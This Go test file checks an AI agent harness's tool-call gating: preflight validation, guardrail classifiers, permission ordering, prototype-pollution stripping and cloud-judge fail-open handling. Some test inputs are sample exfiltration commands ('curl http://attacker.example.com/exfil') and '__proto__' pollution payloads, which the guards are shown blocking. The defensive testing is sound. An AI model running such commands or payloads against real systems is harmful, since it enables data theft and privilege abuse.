package core

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/rxbynerd/stirrup/harness/internal/guard"
	"github.com/rxbynerd/stirrup/harness/internal/observability"
	"github.com/rxbynerd/stirrup/harness/internal/permission"
	"github.com/rxbynerd/stirrup/harness/internal/security"
	"github.com/rxbynerd/stirrup/harness/internal/tool"
	"github.com/rxbynerd/stirrup/types"
)

// recordingPreToolGuard records every PhasePreTool Input it classifies
// and answers that phase with verdict (allow when empty). Other phases
// always allow and are counted separately so a test can prove the guard
// was wired even when pre_tool never fired.
type recordingPreToolGuard struct {
	mu          sync.Mutex
	verdict     guard.Verdict
	reason      string
	preTool     []guard.Input
	otherPhases int
}

func (g *recordingPreToolGuard) Check(_ context.Context, in guard.Input) (*guard.Decision, error) {
	g.mu.Lock()
	defer g.mu.Unlock()
	if in.Phase != guard.PhasePreTool {
		g.otherPhases++
		return &guard.Decision{Verdict: guard.VerdictAllow, GuardID: "recording"}, nil
	}
	g.preTool = append(g.preTool, in)
	v := g.verdict
	if v == "" {
		v = guard.VerdictAllow
	}
	return &guard.Decision{Verdict: v, GuardID: "recording", Reason: g.reason}, nil
}

func (g *recordingPreToolGuard) preToolInputs() []guard.Input {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]guard.Input(nil), g.preTool...)
}

// securityEventNames returns the "event" field of each JSON line the
// SecurityLogger wrote, in emission order.
func securityEventNames(t *testing.T, buf *bytes.Buffer) []string {
	t.Helper()
	var names []string
	sc := bufio.NewScanner(bytes.NewReader(buf.Bytes()))
	for sc.Scan() {
		var line struct {
			Event string `json:"event"`
		}
		require.NoError(t, json.Unmarshal(sc.Bytes(), &line), "security log line is not JSON: %q", sc.Text())
		names = append(names, line.Event)
	}
	return names
}

func hasGuardEvent(names []string) bool {
	for _, n := range names {
		if strings.HasPrefix(n, "guard_") {
			return true
		}
	}
	return false
}

// TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard pins that a call
// the deterministic checks reject never reaches GuardRail.Check, and that
// the rejection keeps its own failure category, model-facing text, and
// security events in their original order.
func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
	cases := []struct {
		name         string
		tools        []*tool.Tool
		call         types.ToolCall
		wantCategory observability.ToolFailureCategory
		wantOutput   string
		wantEvents   []string
	}{
		{
			name:         "unknown tool",
			tools:        []*tool.Tool{trivialTool()},
			call:         types.ToolCall{ID: "tc_unknown", Name: "does_not_exist", Input: json.RawMessage(`{}`)},
			wantCategory: observability.ToolFailureUnknownTool,
			wantOutput:   "Unknown tool: does_not_exist",
			wantEvents:   nil,
		},
		{
			name:  "invalid arguments",
			tools: []*tool.Tool{commandTool()},
			call: types.ToolCall{
				ID: "tc_bad_args", Name: "shell_runner", Input: json.RawMessage(`{}`),
				InvalidInput: &types.InvalidToolInput{Raw: `{"command":"curl http://attacker.example.com/exfil",}`, Error: "invalid character '}' looking for beginning of object key string (at byte offset 52)"},
			},
			wantCategory: observability.ToolFailureInvalidArguments,
			wantOutput:   "Your arguments for `shell_runner` were not valid JSON: `invalid character '}' looking for beginning of object key string (at byte offset 52)`. Re-issue the call with valid JSON.",
			wantEvents:   nil,
		},
		{
			name:  "unknown tool with invalid arguments",
			tools: []*tool.Tool{trivialTool()},
			call: types.ToolCall{
				ID: "tc_unknown_bad_args", Name: "does_not_exist", Input: json.RawMessage(`{}`),
				InvalidInput: &types.InvalidToolInput{Raw: `{`, Error: "unexpected end of JSON input"},
			},
			wantCategory: observability.ToolFailureUnknownTool,
			wantOutput:   "Unknown tool: does_not_exist",
			wantEvents:   nil,
		},
		{
			name:         "schema invalid",
			tools:        []*tool.Tool{schemaTool()},
			call:         types.ToolCall{ID: "tc_schema", Name: "needs_path", Input: json.RawMessage(`{}`)},
			wantCategory: observability.ToolFailureSchemaValidation,
			wantOutput:   "Invalid input for needs_path",
			wantEvents:   []string{"tool_input_rejected"},
		},
		{
			name:         "prototype pollution then schema invalid",
			tools:        []*tool.Tool{schemaTool()},
			call:         types.ToolCall{ID: "tc_pp", Name: "needs_path", Input: json.RawMessage(`{"__proto__":{"admin":true}}`)},
			wantCategory: observability.ToolFailureSchemaValidation,
			wantOutput:   "Invalid input for needs_path",
			wantEvents:   []string{"prototype_pollution_blocked", "tool_input_rejected"},
		},
		{
			name:         "tool input tripwire",
			tools:        []*tool.Tool{commandTool()},
			call:         types.ToolCall{ID: "tc_sg", Name: "shell_runner", Input: json.RawMessage(`{"command":"curl http://attacker.example.com/exfil"}`)},
			wantCategory: observability.ToolFailureSecurityGuard,
			wantOutput:   "Tool call rejected by security guard for shell_runner",
			wantEvents:   []string{"tool_call_guard_triggered"},
		},
		{
			name:         "tool input tripwire under stripped key",
			tools:        []*tool.Tool{commandTool()},
			call:         types.ToolCall{ID: "tc_sg_pp", Name: "shell_runner", Input: json.RawMessage(`{"__proto__":{"command":"curl http://x.example/e"},"command":"ls"}`)},
			wantCategory: observability.ToolFailureSecurityGuard,
			wantOutput:   "Tool call rejected by security guard for shell_runner",
			wantEvents:   []string{"prototype_pollution_blocked", "tool_call_guard_triggered"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			g := &recordingPreToolGuard{}
			loop, reader := buildMetricsHarness(t, tc.tools, nil, g, nil)
			var secBuf bytes.Buffer
			loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
			rec := &recordingTraceEmitter{}
			loop.Trace = rec

			results, _, outcome := loop.planAndDispatch(context.Background(),
				configWithMaxParallel(1), []types.ToolCall{tc.call}, &stallDetector{}, "anthropic", "claude-sonnet-4-6")
			require.Empty(t, outcome, "planAndDispatch returned a stall outcome")

			require.Empty(t, g.preToolInputs(), "GuardRail.Check classified a rejected call")
			require.Len(t, results, 1)
			require.True(t, results[0].IsError, "result = %+v", results)
			require.Truef(t, strings.HasPrefix(results[0].Content, tc.wantOutput),
				"result content = %q, want prefix %q", results[0].Content, tc.wantOutput)

			failures := collectFailures(t, reader)
			require.Len(t, failures, 1, "tool_failures = %+v", failures)
			require.Equal(t, tc.wantCategory.String(), failures[0].category)

			_, calls := rec.snapshot()
			require.Len(t, calls, 1, "trace tool calls = %+v", calls)
			require.Equal(t, tc.wantCategory.String(), calls[0].ErrorCategory)

			events := securityEventNames(t, &secBuf)
			require.False(t, hasGuardEvent(events), "guard event emitted for a preflight rejection: %v", events)
			require.Equal(t, tc.wantEvents, events)
		})
	}
}

// TestPlanAndDispatch_PreToolGuardClassifiesCleanedInput pins that the
// guard classifies the prototype-pollution-stripped input, the same bytes
// the handler receives, and sees the internal tool name.
func TestPlanAndDispatch_PreToolGuardClassifiesCleanedInput(t *testing.T) {
	var handlerInput json.RawMessage
	permissive := &tool.Tool{
		Name:        "permissive",
		Description: "accepts any object",
		InputSchema: json.RawMessage(`{"type":"object","additionalProperties":true}`),
		Handler: func(_ context.Context, input json.RawMessage) (string, error) {
			handlerInput = append(json.RawMessage(nil), input...)
			return "ok", nil
		},
	}
	g := &recordingPreToolGuard{}
	loop, _ := buildMetricsHarness(t, []*tool.Tool{permissive}, nil, g, nil)
	var secBuf bytes.Buffer
	loop.Security = security.NewSecurityLogger(&secBuf, "test-run")

	call := types.ToolCall{
		ID:    "tc_clean",
		Name:  "permissive",
		Input: json.RawMessage(`{"__proto__":{"admin":true},"constructor":"x","safe":"v"}`),
	}
	results, _, _ := loop.planAndDispatch(context.Background(),
		configWithMaxParallel(1), []types.ToolCall{call}, &stallDetector{}, "", "")
	require.Len(t, results, 1)
	require.False(t, results[0].IsError, "result = %+v", results)

	seen := g.preToolInputs()
	require.Len(t, seen, 1, "pre_tool guard calls")
	in := seen[0]
	for _, field := range []struct {
		name  string
		value string
	}{
		{"guard content", in.Content},
		{"guard tool input", string(in.ToolInput)},
	} {
		t.Run(field.name, func(t *testing.T) {
			require.NotContains(t, field.value, "__proto__", "stripped key reached the guard")
			require.NotContains(t, field.value, "constructor", "stripped key reached the guard")
			require.Contains(t, field.value, `"safe":"v"`, "safe key missing from the guard input")
		})
	}
	assert.Equal(t, string(handlerInput), in.Content, "guard content should match the handler input")
	assert.Equal(t, "permissive", in.ToolName)
	assert.Equal(t, "tool_call:permissive", in.Source)

	events := securityEventNames(t, &secBuf)
	require.GreaterOrEqual(t, len(events), 2, "security events = %v", events)
	assert.Equal(t, []string{"prototype_pollution_blocked", "guard_allowed"}, events[:2])
}

// TestPlanAndDispatch_PreToolGuardDenyOutcome pins the deny path for a
// call that passes preflight: fixed model-facing text, guardrail_denied
// category, a guard_denied event, and no handler invocation.
func TestPlanAndDispatch_PreToolGuardDenyOutcome(t *testing.T) {
	handlerCalls := 0
	tl := trivialTool()
	tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
		handlerCalls++
		return "ok", nil
	}
	g := &recordingPreToolGuard{verdict: guard.VerdictDeny, reason: "classifier said no"}
	loop, reader := buildMetricsHarness(t, []*tool.Tool{tl}, nil, g, nil)
	var secBuf bytes.Buffer
	loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
	rec := &recordingTraceEmitter{}
	loop.Trace = rec

	results, _, _ := loop.planAndDispatch(context.Background(),
		configWithMaxParallel(1),
		[]types.ToolCall{{ID: "tc_deny", Name: "trivial", Input: json.RawMessage(`{}`)}},
		&stallDetector{}, "", "")

	require.Len(t, g.preToolInputs(), 1, "pre_tool guard calls")
	assert.Zero(t, handlerCalls, "handler ran after a guard deny")
	require.Len(t, results, 1)
	require.True(t, results[0].IsError, "result = %+v", results)
	require.Equal(t, "guardrail blocked tool call", results[0].Content)

	failures := collectFailures(t, reader)
	require.Len(t, failures, 1, "tool_failures = %+v", failures)
	require.Equal(t, observability.ToolFailureGuardrailDenied.String(), failures[0].category)

	_, calls := rec.snapshot()
	require.Len(t, calls, 1, "trace tool calls = %+v", calls)
	require.Equal(t, "guardrail blocked tool call: classifier said no", calls[0].ErrorReason)

	events := securityEventNames(t, &secBuf)
	require.Equal(t, []string{"guard_denied"}, events)
}

// TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard drives a full run:
// the model emits a schema-invalid tool call, the guard is wired for every
// phase, and the call fails as schema_validation_failed without a
// pre_tool classification.
func TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard(t *testing.T) {
	scripted := &scriptedProvider{
		turns: [][]types.StreamEvent{
			{
				{Type: "tool_call", ID: "tc_bad", Name: "needs_path", Input: map[string]any{"unexpected": 1}},
				{Type: "message_complete", StopReason: "tool_use"},
			},
			{
				{Type: "text_delta", Text: "done"},
				{Type: "message_complete", StopReason: "end_turn"},
			},
		},
	}
	g := &recordingPreToolGuard{}
	loop := buildTestLoop(nil)
	loop.Provider = scripted
	registry := tool.NewRegistry()
	registry.Register(schemaTool())
	loop.Tools = registry
	loop.GuardRail = g
	rec := &recordingTraceEmitter{}
	loop.Trace = rec
	config := buildTestConfig()
	config.MaxTurns = 4

	_, err := loop.Run(context.Background(), config)
	require.NoError(t, err)
	assert.Equal(t, 2, scripted.turn, "provider turns (the run continues after the tool failure)")
	assert.Empty(t, g.preToolInputs(), "pre_tool guard calls")
	assert.NotZero(t, g.otherPhases, "guard saw no pre_turn/post_turn calls; the test is not exercising a wired guard")

	_, calls := rec.snapshot()
	require.Len(t, calls, 1, "recorded tool calls")
	assert.False(t, calls[0].Success, "tool call trace should record a failure")
	assert.Equal(t, observability.ToolFailureSchemaValidation.String(), calls[0].ErrorCategory)
}

// gateOrder records the gating surfaces a call reached, in order.
type gateOrder struct {
	mu    sync.Mutex
	steps []string
}

func (o *gateOrder) record(step string) {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.steps = append(o.steps, step)
}

func (o *gateOrder) String() string {
	o.mu.Lock()
	defer o.mu.Unlock()
	return strings.Join(o.steps, ",")
}

type orderedPreToolGuard struct {
	order   *gateOrder
	verdict guard.Verdict
}

func (g *orderedPreToolGuard) Check(_ context.Context, in guard.Input) (*guard.Decision, error) {
	if in.Phase == guard.PhasePreTool {
		g.order.record("guard")
	}
	return &guard.Decision{Verdict: g.verdict, GuardID: "ordered"}, nil
}

type orderedPolicy struct {
	order   *gateOrder
	allowed bool
}

func (p *orderedPolicy) Check(_ context.Context, _ types.ToolDefinition, _ json.RawMessage) (*permission.PermissionResult, error) {
	p.order.record("permission")
	return &permission.PermissionResult{Allowed: p.allowed, Reason: "ordered policy"}, nil
}

// TestPlanAndDispatch_PreToolGuardRunsBeforePermission pins that the
// pre_tool guard classifies a permission-gated call before the policy sees
// it: a guard deny never reaches PermissionPolicy.Check, and a permission
// verdict always follows a guard allow.
func TestPlanAndDispatch_PreToolGuardRunsBeforePermission(t *testing.T) {
	gatedTools := []struct {
		name string
		new  func() *tool.Tool
	}{
		{"workspace mutating", mutatingTool},
		{"requires approval", func() *tool.Tool {
			tl := trivialTool()
			tl.RequiresApproval = true
			return tl
		}},
	}
	cases := []struct {
		name         string
		verdict      guard.Verdict
		permAllowed  bool
		wantOrder    string
		wantCategory observability.ToolFailureCategory
	}{
		{"guard deny", guard.VerdictDeny, true, "guard", observability.ToolFailureGuardrailDenied},
		{"guard allow permission allow", guard.VerdictAllow, true, "guard,permission", ""},
		{"guard allow permission deny", guard.VerdictAllow, false, "guard,permission", observability.ToolFailurePermissionDenied},
	}
	for _, gt := range gatedTools {
		for _, tc := range cases {
			t.Run(gt.name+"/"+tc.name, func(t *testing.T) {
				handlerCalls := 0
				tl := gt.new()
				tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
					handlerCalls++
					return "ok", nil
				}
				order := &gateOrder{}
				loop, reader := buildMetricsHarness(t, []*tool.Tool{tl},
					&orderedPolicy{order: order, allowed: tc.permAllowed},
					&orderedPreToolGuard{order: order, verdict: tc.verdict}, nil)

				results, _, _ := loop.planAndDispatch(context.Background(), configWithMaxParallel(1),
					[]types.ToolCall{{ID: "tc_gate", Name: tl.Name, Input: json.RawMessage(`{}`)}},
					&stallDetector{}, "", "")

				require.Equal(t, tc.wantOrder, order.String(), "gate order")
				wantRan := tc.wantCategory == ""
				require.Equal(t, wantRan, handlerCalls == 1, "handler ran %d times", handlerCalls)
				require.Len(t, results, 1)
				require.Equal(t, !wantRan, results[0].IsError, "results = %+v", results)

				failures := collectFailures(t, reader)
				if wantRan {
					require.Empty(t, failures, "tool_failures")
					return
				}
				require.Len(t, failures, 1, "tool_failures = %+v", failures)
				require.Equal(t, tc.wantCategory.String(), failures[0].category)
			})
		}
	}
}

// TestPlanAndDispatch_AsyncToolReceivesGuardedInput pins that an async
// tool's AsyncHandler and its tool_result_request carry the same stripped
// bytes the pre_tool guard classified, and that a guard deny stops the
// call before either.
func TestPlanAndDispatch_AsyncToolReceivesGuardedInput(t *testing.T) {
	const rawInput = `{"__proto__":{"admin":true},"path":"x"}`
	for _, verdict := range []guard.Verdict{guard.VerdictAllow, guard.VerdictDeny} {
		t.Run(string(verdict), func(t *testing.T) {
			var mu sync.Mutex
			var handlerInputs []string
			asyncTool := &tool.Tool{
				Name:        "async_path",
				Description: "async tool taking a path",
				InputSchema: json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"}},"required":["path"]}`),
				AsyncHandler: func(_ context.Context, input json.RawMessage) (tool.AsyncDispatch, error) {
					mu.Lock()
					defer mu.Unlock()
					handlerInputs = append(handlerInputs, string(input))
					return tool.AsyncDispatch{}, nil
				},
			}
			tr := newAsyncTestTransport()
			g := &recordingPreToolGuard{verdict: verdict}
			loop, _ := buildMetricsHarness(t, []*tool.Tool{asyncTool}, nil, g, tr)
			call := types.ToolCall{ID: "tc_async_guarded", Name: "async_path", Input: json.RawMessage(rawInput)}
			if verdict == guard.VerdictAllow {
				go fireResponseWhenEmitted(t, tr, call.ID, 0, "async-ok")
			}

			results, _, _ := loop.planAndDispatch(context.Background(), configWithMaxParallel(2),
				[]types.ToolCall{call}, &stallDetector{}, "", "")

			seen := g.preToolInputs()
			require.Len(t, seen, 1, "pre_tool guard calls")
			guarded := seen[0].Content
			require.NotContains(t, guarded, "__proto__", "guard content should drop the stripped key")
			require.Contains(t, guarded, `"path":"x"`, "guard content should keep the path key")
			require.Equal(t, guarded, string(seen[0].ToolInput), "guard ToolInput should match Content")

			var requests []types.HarnessEvent
			for _, e := range tr.Events() {
				if e.Type == "tool_result_request" {
					requests = append(requests, e)
				}
			}
			mu.Lock()
			inputs := append([]string(nil), handlerInputs...)
			mu.Unlock()

			if verdict == guard.VerdictDeny {
				require.Empty(t, inputs, "guard deny reached AsyncHandler")
				require.Empty(t, requests, "guard deny emitted a tool_result_request")
				require.Len(t, results, 1)
				require.True(t, results[0].IsError, "results = %+v", results)
				return
			}
			require.Len(t, results, 1)
			require.False(t, results[0].IsError, "results = %+v", results)
			require.Equal(t, "async-ok", results[0].Content)
			require.Equal(t, []string{guarded}, inputs, "AsyncHandler inputs")
			require.Len(t, requests, 1, "tool_result_request events")
			require.Equal(t, guarded, string(requests[0].Input))
		})
	}
}

var judgePromptNonce = regexp.MustCompile(`<<<UNTRUSTED_CONTENT_([0-9a-f]+)>>>`)

// nonceEchoJudgeProvider answers a cloud-judge prompt with a verdict that
// carries the prompt's fence nonce, then completes with stopReason.
type nonceEchoJudgeProvider struct {
	verdict    string
	stopReason string
}

func (p *nonceEchoJudgeProvider) Stream(_ context.Context, params types.StreamParams) (<-chan types.StreamEvent, error) {
	nonce := ""
	for _, m := range params.Messages {
		for _, b := range m.Content {
			if sm := judgePromptNonce.FindStringSubmatch(b.Text); sm != nil {
				nonce = sm[1]
			}
		}
	}
	ch := make(chan types.StreamEvent, 2)
	ch <- types.StreamEvent{Type: "text_delta", Text: fmt.Sprintf(`{"nonce":%q,"verdict":%q,"reason":"r"}`, nonce, p.verdict)}
	ch <- types.StreamEvent{Type: "message_complete", StopReason: p.stopReason}
	close(ch)
	return ch, nil
}

// TestPlanAndDispatch_CloudJudgeIncompleteStreamFollowsFailOpen pins that a
// cloud-judge verdict from a stream cut at max_tokens is a guard error, so
// the call is denied unless failOpen is set, while a completed verdict is
// honoured under either setting.
func TestPlanAndDispatch_CloudJudgeIncompleteStreamFollowsFailOpen(t *testing.T) {
	cases := []struct {
		name       string
		verdict    string
		stopReason string
		failOpen   bool
		wantRan    bool
		wantErrEvt bool
	}{
		{"end turn allow", "allow", "end_turn", false, true, false},
		{"end turn deny fail open", "deny", "end_turn", true, false, false},
		{"max tokens allow", "allow", "max_tokens", false, false, true},
		{"max tokens allow fail open", "allow", "max_tokens", true, true, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cj, err := guard.NewCloudJudge(guard.CloudJudgeConfig{
				Provider: &nonceEchoJudgeProvider{verdict: tc.verdict, stopReason: tc.stopReason},
			})
			require.NoError(t, err, "NewCloudJudge")
			handlerCalls := 0
			tl := trivialTool()
			tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
				handlerCalls++
				return "ok", nil
			}
			loop, reader := buildMetricsHarness(t, []*tool.Tool{tl}, nil, cj, nil)
			var secBuf bytes.Buffer
			loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
			config := configWithMaxParallel(1)
			config.GuardRail = &types.GuardRailConfig{FailOpen: tc.failOpen}

			results, _, _ := loop.planAndDispatch(context.Background(), config,
				[]types.ToolCall{{ID: "tc_cj", Name: "trivial", Input: json.RawMessage(`{}`)}},
				&stallDetector{}, "", "")

			require.Equal(t, tc.wantRan, handlerCalls == 1, "handler ran %d times; results %+v", handlerCalls, results)
			if !tc.wantRan {
				failures := collectFailures(t, reader)
				require.Len(t, failures, 1, "tool_failures = %+v", failures)
				require.Equal(t, observability.ToolFailureGuardrailDenied.String(), failures[0].category)
			}
			require.Equal(t, tc.wantErrEvt, strings.Contains(secBuf.String(), `"guard_error"`),
				"security log: %s", secBuf.String())
		})
	}
}
